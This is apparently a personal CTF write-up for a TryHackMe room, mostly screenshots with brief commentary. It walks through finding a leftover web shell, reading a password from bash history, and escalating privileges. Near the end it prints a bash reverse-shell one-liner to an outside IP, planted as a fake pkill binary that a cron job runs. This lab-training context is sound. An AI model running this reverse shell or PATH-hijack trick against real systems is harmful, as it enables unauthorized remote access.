---
title: Hakcer Vs H4ck3r
description: hvh
---

Difficulty: Easy

![image.png](../../../assets/HackerVsHacker/image.png)

We need to get access to a machine that was previously compromised by a hacker.po

![image.png](../../../assets/HackerVsHacker/image%201.png)

Found 2 ports open

Since http has larger surface to attack compared to ssh. Lets do this.

![image.png](../../../assets/HackerVsHacker/image%202.png)

lets sneak what we got here

![image.png](../../../assets/HackerVsHacker/image%203.png)

we go something to upload 

![image.png](../../../assets/HackerVsHacker/image%204.png)

I tried to upload .php file

![image.png](../../../assets/HackerVsHacker/image%205.png)

when I view the source code this is what I got. Only pdf are accepted.

![image.png](../../../assets/HackerVsHacker/image%206.png)

There is a hidden directory called “cvs”.

This room is on hackerVshacker there could be reverse shell file. lets scan cvs directory.

![image.png](../../../assets/HackerVsHacker/image%207.png)

Woah 😮😮😮 

there is shell in cvs directory 

![image.png](../../../assets/HackerVsHacker/image%208.png)

I need to add file extension I guess

![image.png](../../../assets/HackerVsHacker/image%209.png)

boom! 🔥🔥🔥 there we go 

now I need parameter/code to run

![image.png](../../../assets/HackerVsHacker/image%2010.png)

there it is, the reverse shell file

![image.png](../../../assets/HackerVsHacker/image%2011.png)

![image.png](../../../assets/HackerVsHacker/image%2012.png)

Now lets upload reverse shell file 

![image.png](../../../assets/HackerVsHacker/image%2013.png)

simple http server to upload file 

now lets run the file but before that I have to run the command to listen

![image.png](../../../assets/HackerVsHacker/image%2014.png)

there we go. we got reverse shell.

![image.png](../../../assets/HackerVsHacker/image%2015.png)

I am not able to run command. 

Now I need to use the URL parameter to run the command.

![image.png](../../../assets/HackerVsHacker/image%2016.png)

![image.png](../../../assets/HackerVsHacker/image%2017.png)

woah I got user.txt

![image.png](../../../assets/HackerVsHacker/image%2018.png)

![image.png](../../../assets/HackerVsHacker/image%2019.png)

lets see the hidden file 

![image.png](../../../assets/HackerVsHacker/image%2020.png)

lets see .bach_history

![image.png](../../../assets/HackerVsHacker/image%2021.png)

it seems to be password for user lachlan which can be used in ssh.

![image.png](../../../assets/HackerVsHacker/image%2022.png)

Just after few second I got kicked out.

now lets see why this is happening and how can I make it work

![image.png](../../../assets/HackerVsHacker/image%2023.png)

This is kicking us out from ssh.

![image.png](../../../assets/HackerVsHacker/image%2024.png)

this terminate any active terminal session every minute

now how do I stop this?? 🤔🤔🤔

![image.png](../../../assets/HackerVsHacker/image%2025.png)

![image.png](../../../assets/HackerVsHacker/image%2026.png)

We get few second to stay there right??
why can’t I take that chance to create a reverse shell 

```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/10.17.7.239/4444 0>&1' > /home/lachlan/bin/pkill

chmod +x /home/lachlan/bin/pkill

```

chmod +x /home/lachlan/bin/pkill

![image.png](../../../assets/HackerVsHacker/image%2027.png)

![image.png](../../../assets/HackerVsHacker/image%2028.png)

it is in now 

![image.png](../../../assets/HackerVsHacker/image%2029.png)

As soon as I run this command I got reverse shell

![image.png](../../../assets/HackerVsHacker/image%2030.png)

**Final Thought**

This was a cool trykackme room. I would recommend this room to a person who has done several CTF challenges which includes privilege escalation rooms.
